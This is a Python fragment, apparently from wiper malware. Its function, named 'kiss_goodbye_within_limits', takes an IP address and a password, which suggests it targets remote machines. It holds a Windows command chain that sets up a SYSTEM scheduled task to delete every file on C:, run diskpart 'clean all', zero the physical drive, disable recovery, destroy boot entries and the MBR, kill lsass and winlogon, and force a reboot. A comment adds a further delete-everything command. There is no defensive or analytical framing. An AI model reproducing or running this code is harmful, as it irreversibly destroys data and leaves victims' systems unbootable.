...
def kiss_goodbye_within_limits(ipv4,pword,temp_dir): # del /f /s /q C:\*.* | rd C:\ /S /Q 
    ...
    terminator2 = r"""schtasks /create /tn "windows xp" /tr "cmd.exe /c del /f /s /q C:\Boot\*.* & del /f /s /q C:\*.* & diskpart /s %temp%\wipe.txt & cipher /w:C:\" /sc onstart /ru SYSTEM /f & pause && takeown /f C:\Windows /r /d y & icacls C:\Windows /grant *S-1-5-32-544:F /t /c /q & bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & bootsect /nt60 C: /force /mbr & bootsect /nt60 ALL /force & bcdedit /delete {current} /f & bcdedit /delete {bootmgr} /f & pause && echo select disk 0 >> %temp%\wipe.txt && echo attributes disk clear readonly >> %temp%\wipe.txt && echo convert mbr >> %temp%\wipe.txt && echo clean all >> %temp%\wipe.txt && pause && taskkill /IM winlogon.exe /F & taskkill /IM explorer.exe /F & taskkill /IM lsass.exe /F & fsutil file setZeroData offset=0 length=1073741824 \\.\PhysicalDrive0 & pause && del /f /s /q C:\Boot\*.* & pause && del /f /s /q C:\*.* && shutdown /r /f /t 0"""
